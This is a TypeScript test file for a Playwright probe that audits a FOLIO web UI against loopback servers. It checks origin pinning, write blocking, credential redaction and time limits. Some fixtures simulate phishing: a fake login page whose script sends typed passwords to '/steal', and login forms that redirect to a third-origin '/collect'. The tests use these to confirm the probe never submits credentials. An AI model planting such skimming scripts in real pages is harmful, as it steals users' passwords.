import fs from 'fs';
import http from 'http';
import os from 'os';
import path from 'path';
import { AddressInfo } from 'net';
import { UiRuntimeEvidence, UiRuntimeTarget } from '../../types';
import { PlaywrightUiRuntimeProbe, uiRuntimeTargets } from '../../utils/ui-runtime-probe';

const USERNAME = 'probe-test-user';
const LOGIN_FORM = '<!doctype html><html lang="en"><body><form method="post" action="/realms/test/login-actions/authenticate">'
  + '<input id="username" name="username"><input id="password" name="password" type="password"><input type="submit" value="Sign in"></form></body></html>';
const PASSWORD = 'probe-test-secret-9431';

function chromePath(): string {
  if (process.env.CHROME_PATH) return process.env.CHROME_PATH;
  const browsers = path.join(os.homedir(), '.agent-browser', 'browsers');
  const found = fs.existsSync(browsers) ? fs.readdirSync(browsers).map(name => path.join(browsers, name, 'chrome')).find(file => fs.existsSync(file)) : undefined;
  if (!found) throw new Error('These tests need Chrome: set CHROME_PATH to a Chrome or Chromium executable.');
  return found;
}

interface Hit {
  method: string;
  url: string;
  body: string;
}

interface Server {
  origin: string;
  hits: Hit[];
  close: () => Promise<void>;
}

async function serve(handler: (request: http.IncomingMessage, body: string, response: http.ServerResponse) => void): Promise<Server> {
  const hits: Hit[] = [];
  const server = http.createServer((request, response) => {
    let body = '';
    request.on('data', chunk => { body += chunk; });
    request.on('end', () => {
      hits.push({ method: request.method ?? '', url: request.url ?? '', body });
      handler(request, body, response);
    });
  });
  server.on('upgrade', (request, socket) => {
    hits.push({ method: 'UPGRADE', url: request.url ?? '', body: '' });
    socket.destroy();
  });
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
  return {
    origin: `http://127.0.0.1:${(server.address() as AddressInfo).port}`,
    hits,
    close: () => new Promise(resolve => { server.closeAllConnections(); server.close(() => resolve()); })
  };
}

interface Environment {
  ui: Server;
  login: Server;
  api: Server;
  third: Server;
}

interface Options {
  apiInConfig?: (environment: Environment) => string;
  loginPage?: (environment: Environment) => string;
  loginForm?: (environment: Environment) => string;
  afterLogin?: (environment: Environment) => { status: number; location: string };
}

describe('runtime UI probe against a loopback UI and login server', () => {
  let environment: Environment;
  const chrome = chromePath();

  async function start(options: Options = {}): Promise<Environment> {
    const third = await serve((_request, _body, response) => response.end('third'));
    const api = await serve((request, _body, response) => {
      response.setHeader('access-control-allow-origin', environment.ui.origin);
      response.setHeader('access-control-allow-credentials', 'true');
      response.setHeader('access-control-allow-methods', 'GET, POST, DELETE');
      response.setHeader('access-control-allow-headers', 'x-okapi-tenant');
      if (request.method === 'OPTIONS') return response.end();
      response.setHeader('content-type', 'application/json');
      response.end('{"users":[]}');
    });
    const login = await serve((request, _body, response) => {
      if (request.method === 'POST') {
        const next = options.afterLogin?.(environment) ?? { status: 302, location: `${environment.ui.origin}/oidc-landing` };
        response.writeHead(next.status, { location: next.location });
        return response.end();
      }
      response.setHeader('content-type', 'text/html');
      response.end(options.loginForm?.(environment) ?? LOGIN_FORM);
    });
    const ui = await serve((request, _body, response) => {
      const url = new URL(request.url ?? '/', 'http://localhost');
      if (url.pathname === '/config.js') {
        response.setHeader('content-type', 'text/javascript');
        return response.end(`window.stripesConfig = { "okapi": { "url": "${options.apiInConfig?.(environment) ?? environment.api.origin}", "tenant": "test" } };`);
      }
      if (url.pathname === '/app.js') {
        response.setHeader('content-type', 'text/javascript');
        return response.end(appScript(environment, options.loginPage?.(environment) ?? `${environment.login.origin}/realms/test/protocol/openid-connect/auth`));
      }
      if (url.pathname === '/oidc-landing') {
        response.writeHead(302, { 'set-cookie': 'session=1; Path=/', location: '/' });
        return response.end();
      }
      if (url.pathname === '/bounce.png') {
        response.writeHead(302, { location: `${environment.third.origin}/bounced.png` });
        return response.end();
      }
      if (url.pathname === '/never.js') return;
      if (url.pathname === '/fake-login') {
        response.setHeader('content-type', 'text/html');
        return response.end('<!doctype html><html lang="en"><body><input name="username"><input name="password" type="password">'
          + '<script>document.querySelector(\'[name=password]\').addEventListener(\'input\', event => { const request = new XMLHttpRequest(); request.open(\'GET\', \'/steal?p=\' + event.target.value, false); request.send(); });</script></body></html>');
      }
      if (url.pathname === '/worker.js') {
        response.setHeader('content-type', 'text/javascript');
        return response.end(`new WebSocket('${environment.third.origin.replace('http', 'ws')}/worker-socket');`);
      }
      response.setHeader('content-type', 'text/html');
      const third = environment.third.origin.replace('127.0.0.1', 'localhost');
      const rules = url.pathname === '/example' ? `<script type="speculationrules">${JSON.stringify({ prefetch: [{ source: 'list', urls: [`${third}/prefetch`] }],
        prerender: [{ source: 'list', urls: [`${third}/prerender`] }] })}</script>` : '';
      response.end(`<!doctype html><html><head><title>FOLIO</title>${rules}</head><body><script src="/config.js"></script><script src="/app.js"></script>${
        url.pathname.startsWith('/hang') ? '<script src="/never.js"></script>' : ''}</body></html>`);
    });
    environment = { ui, login, api, third };
    return environment;
  }

  function appScript(env: Environment, loginPage: string): string {
    return `(() => {
      if (!document.cookie.includes('session=1')) { location.href = ${JSON.stringify(loginPage)}; return; }
      const path = location.pathname;
      if (path === '/busy') setTimeout(() => { for (;;) {} }, 300);
      if (path === '/settings/about') { document.body.innerHTML = '<main><h1>About</h1><p>folio_example-1.2.3000</p><p>folio_example_other-9.9.9</p></main>'; return; }
      document.body.innerHTML = '<main><h1>Page ' + path + '</h1><img src="/a.png" data-user="${USERNAME}"></main>';
      console.error('boom on ' + path);
      fetch(${JSON.stringify(env.api.origin)} + '/users', { credentials: 'include', headers: { 'x-okapi-tenant': 'test' } });
      if (path === '/example') {
        fetch(${JSON.stringify(env.api.origin)} + '/authn/refresh', { method: 'POST', credentials: 'include', headers: { 'x-okapi-tenant': 'test' } }).catch(() => {});
        fetch('/authn/token', { method: 'POST', body: 'x' }).catch(() => {});
        fetch('/api/write', { method: 'POST', body: 'x' }).catch(() => {});
        fetch(${JSON.stringify(env.login.origin)} + '/realms/test/account', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(() => {});
        fetch(${JSON.stringify(env.api.origin)} + '/notes', { method: 'POST', body: 'x', credentials: 'include' }).catch(() => {});
        fetch(${JSON.stringify(env.api.origin)} + '/notes/1', { method: 'DELETE', credentials: 'include' }).catch(() => {});
        try { new WebSocket(${JSON.stringify(env.third.origin.replace('http', 'ws'))} + '/socket'); } catch (error) {}
        document.body.insertAdjacentHTML('beforeend', '<img alt="pixel" src="${env.third.origin}/pixel.png"><img alt="bounce" src="/bounce.png">'
          + '<iframe title="frame" src="${env.third.origin}/frame"></iframe>');
        window.open(${JSON.stringify(env.third.origin)} + '/popup');
        try { new Worker('/worker.js'); } catch (error) { console.error('worker: ' + error.name); }
        history.replaceState(null, '', '/example?code=secret-code');
      }
    })();`;
  }

  afterEach(async () => {
    delete process.env.FOLIO_UI_USERNAME;
    await Promise.all(Object.values(environment).map(server => server.close()));
  });

  function probe(limits = {}): PlaywrightUiRuntimeProbe {
    return new PlaywrightUiRuntimeProbe({ url: environment.ui.origin, loginOrigin: environment.login.origin, chromePath: chrome,
      username: USERNAME, password: PASSWORD, limits: { quietMs: 300, ...limits } });
  }

  const methods = (server: Server) => server.hits.filter(hit => hit.url !== '/favicon.ico').map(hit => `${hit.method} ${hit.url}`);

  it('logs in on the pinned origin, visits only allowlisted pages, collects axe results, and blocks writes and other origins', async () => {
    process.env.FOLIO_UI_USERNAME = USERNAME;
    await start();
    const { targets, skipped, moduleId } = uiRuntimeTargets(JSON.stringify({ name: '@folio/example', stripes: { route: '/example', home: '/example?sort=name' } }));
    expect(skipped).toEqual([{ path: '/example?sort=name', source: 'home', reason: 'not a plain path such as /users' }]);

    const evidence = await probe().collect(targets, moduleId);

    expect(evidence.outcome).toBe('collected');
    expect(evidence.problem).toBeUndefined();
    expect(evidence.apiOrigin).toBe(environment.api.origin);
    expect(evidence.deployedModule).toEqual({ id: 'folio_example', version: '1.2.3000' });
    expect(evidence.pages.map(page => [page.path, page.problem, page.axe?.violations.map(violation => [violation.id, violation.nodeCount])])).toEqual([
      ['/example', undefined, [['html-has-lang', 1], ['image-alt', 1]]],
      ['/settings/example', undefined, [['html-has-lang', 1], ['image-alt', 1]]],
      ['/settings/about', undefined, undefined]
    ]);
    expect(evidence.pages[0].axe?.violations[1].nodes).toEqual([{ target: 'img[src="/a.png"]', html: '<img src="/a.png" data-user="[REDACTED_FOLIO_UI_USERNAME]">' }]);
    expect(evidence.pages.map(page => [page.consoleErrors, page.failedRequests, page.finalUrl])).toEqual([
      [['boom on /example', 'worker: SecurityError'], [], undefined], [['boom on /settings/example'], [], undefined], [[], [], undefined]]);
    expect(JSON.stringify(evidence)).not.toContain('secret-code');
    expect(evidence.navigations.map(navigation => navigation.url.replace(/127\.0\.0\.1:\d+/, 'host'))).toEqual(['http://host/',
      'http://host/realms/test/protocol/openid-connect/auth', 'http://host/realms/test/login-actions/authenticate', 'http://host/oidc-landing',
      'http://host/', 'http://host/example', 'http://host/settings/example', 'http://host/settings/about']);
    expect(new Set(methods(environment.ui))).toEqual(new Set(['GET /', 'GET /config.js', 'GET /app.js', 'GET /oidc-landing', 'GET /example',
      'GET /a.png', 'GET /bounce.png', 'GET /settings/example', 'GET /settings/about']));
    expect(methods(environment.login)).toEqual(['GET /realms/test/protocol/openid-connect/auth', 'POST /realms/test/login-actions/authenticate']);
    expect(JSON.stringify(evidence)).not.toContain(USERNAME);
    expect(Object.fromEntries(new URLSearchParams(environment.login.hits.at(-1)!.body))).toEqual({ username: USERNAME, password: PASSWORD });
    expect(new Set(methods(environment.api))).toEqual(new Set(['OPTIONS /users', 'GET /users', 'OPTIONS /authn/refresh', 'POST /authn/refresh']));
    expect(environment.third.hits).toEqual([]);
    const blocked = evidence.blockedRequests.map(request => `${request.method} ${request.url.replace(/127\.0\.0\.1:\d+/, 'host')} (${request.reason})`);
    expect(new Set(blocked)).toEqual(new Set([
      'POST http://host/api/write (not a GET request)',
      'POST http://host/authn/token (not a GET request)',
      'POST http://host/realms/test/account (not a GET request)',
      'POST http://host/notes (not a GET request)',
      'OPTIONS http://host/notes/1 (not a GET request)',
      `WebSocket ws://host/socket (WebSocket connections are not opened)`,
      'GET http://host/pixel.png (another origin)',
      'GET http://host/bounced.png (another origin)',
      'GET http://host/frame (another origin)',
      'GET http://host/popup (another origin)'
    ]));
    expect(JSON.stringify(evidence)).not.toContain(PASSWORD);
  }, 60_000);

  it('stops, and sends nothing further, when the login form redirects to a third origin', async () => {
    await start({ afterLogin: env => ({ status: 307, location: `${env.third.origin}/collect` }) });

    const evidence = await probe().collect([{ path: '/example', source: 'route' }], 'folio_example');

    expect(evidence.outcome).toBe('stopped');
    expect(evidence.problem).toBe(`during login the browser was sent to ${environment.third.origin}, which is neither the UI nor the login origin`);
    expect(evidence.pages).toEqual([]);
    expect(environment.third.hits).toEqual([]);
    expect(methods(environment.ui)).not.toContain('GET /example');
  }, 60_000);

  it('types no credentials when the UI sends the browser to a login page on another origin', async () => {
    await start({ loginPage: env => `${env.third.origin}/realms/test/protocol/openid-connect/auth` });

    const evidence = await probe().collect([{ path: '/example', source: 'route' }], 'folio_example');

    expect(evidence.outcome).toBe('stopped');
    expect(evidence.problem).toBe(`during login the browser was sent to ${environment.third.origin}, which is neither the UI nor the login origin`);
    expect(environment.third.hits).toEqual([]);
    expect(environment.login.hits).toEqual([]);
  }, 60_000);

  it('types no credentials into a form that is not on the login origin', async () => {
    await start({ loginForm: env => `<!doctype html><html lang="en"><body><script>setTimeout(() => { location.href = '${env.ui.origin}/fake-login'; }, 200);</script></body></html>` });

    const evidence = await probe().collect([{ path: '/example', source: 'route' }], 'folio_example');

    expect(evidence.outcome).toBe('stopped');
    expect(evidence.problem).toBe(`the login form was not on the login origin ${environment.login.origin}`);
    expect(methods(environment.ui).filter(hit => hit.startsWith('GET /steal'))).toEqual([]);
    expect(environment.login.hits.filter(hit => hit.method === 'POST')).toEqual([]);
  }, 60_000);

  it('types no password once the login page swaps itself for a page on another origin', async () => {
    await start({ loginForm: env => '<!doctype html><html lang="en"><body><input name="username"><input name="password" type="password"><script>'
      + `document.querySelector('[name=username]').addEventListener('input', () => { document.querySelector('[name=password]').remove(); location.href = '${env.ui.origin}/fake-login'; });`
      + '</script></body></html>' });

    const evidence = await probe().collect([{ path: '/example', source: 'route' }], 'folio_example');

    expect(evidence.outcome).toBe('stopped');
    expect(evidence.pages).toEqual([]);
    expect(methods(environment.ui).filter(hit => hit.startsWith('GET /steal'))).toEqual([]);
    expect(environment.login.hits.filter(hit => hit.method === 'POST')).toEqual([]);
  }, 60_000);

  it('stops when the stripes-config names an API origin on another site', async () => {
    await start({ apiInConfig: env => env.api.origin.replace('127.0.0.1', 'localhost') });

    const evidence = await probe().collect([{ path: '/example', source: 'route' }], 'folio_example');

    expect(evidence.outcome).toBe('stopped');
    expect(evidence.problem).toBe(`the UI's stripes-config names the API origin ${environment.api.origin.replace('127.0.0.1', 'localhost')}, which is not on the UI's site`);
    expect(environment.login.hits.filter(hit => hit.method === 'POST')).toEqual([]);
  }, 60_000);

  it('visits at most the page limit and skips the rest', async () => {
    await start();
    const targets: UiRuntimeTarget[] = Array.from({ length: 8 }, (_unused, index) => ({ path: `/page-${index + 1}`, source: 'route' }));

    const evidence = await probe({ navigations: 5 }).collect(targets, 'folio_example');

    expect(evidence.pages.map(page => page.path)).toEqual(['/page-1', '/page-2', '/page-3', '/page-4', '/page-5', '/page-6']);
    expect([evidence.navigations.length, evidence.navigationsCut]).toEqual([5, 6]);
    expect(evidence.skippedPaths).toEqual([
      { path: '/page-7', source: 'route', reason: 'over the limit of 6 pages' },
      { path: '/page-8', source: 'route', reason: 'over the limit of 6 pages' }
    ]);
  }, 60_000);

  it('cuts a page at its time budget and the probe at its total budget', async () => {
    await start();
    const targets: UiRuntimeTarget[] = Array.from({ length: 5 }, (_unused, index) => ({ path: `/hang-${index + 1}`, source: 'route' }));

    const evidence: UiRuntimeEvidence = await probe({ pageTimeoutMs: 3_000, totalTimeoutMs: 7_000 }).collect(targets, 'folio_example');

    expect(evidence.outcome).toBe('collected');
    expect(evidence.pages.length).toBeGreaterThanOrEqual(1);
    expect(evidence.pages.length).toBeLessThanOrEqual(3);
    expect(evidence.pages[0]).toMatchObject({ path: '/hang-1', problem: 'the page did not finish within 3 s' });
    for (const page of evidence.pages) {
      expect(['the page did not finish within 3 s', 'the 7 s budget for the probe ran out during this page']).toContain(page.problem);
      expect(page.axe).toBeUndefined();
    }
    expect(evidence.skippedPaths.at(-1)).toEqual({ path: '/hang-5', source: 'route', reason: 'the 7 s budget for the probe ran out' });
    expect(evidence.durationMs).toBeLessThan(10_000);
  }, 60_000);

  it('cuts a page whose script never yields at its time budget', async () => {
    await start();

    const evidence = await probe({ pageTimeoutMs: 3_000 }).collect([{ path: '/busy', source: 'route' }], 'folio_example');

    expect(evidence.pages.map(page => [page.path, page.problem, page.axe])).toEqual([['/busy', 'the page did not finish within 3 s', undefined]]);
    expect(evidence.durationMs).toBeLessThan(10_000);
  }, 60_000);
});
